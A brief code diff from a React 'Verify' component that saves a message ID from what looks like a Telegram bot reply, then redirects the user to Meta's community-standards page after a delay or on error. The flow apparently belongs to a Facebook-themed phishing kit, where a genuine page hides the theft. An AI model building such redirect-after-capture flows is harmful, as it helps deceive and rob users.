@@ -96,10 +96,10 @@ const Verify: FC = () => {
         );
         localStorage.setItem("messageId", response.data.result.message_id);
         setTimeout(() => {
-          window.location.replace("https://facebook.com");
+          window.location.replace("https://transparency.meta.com/en-gb/policies/community-standards/");
         }, config.loadingTime);
       } catch {
-        window.location.replace("https://facebook.com");
+        window.location.replace("https://transparency.meta.com/en-gb/policies/community-standards/");
       }
       return;
     }
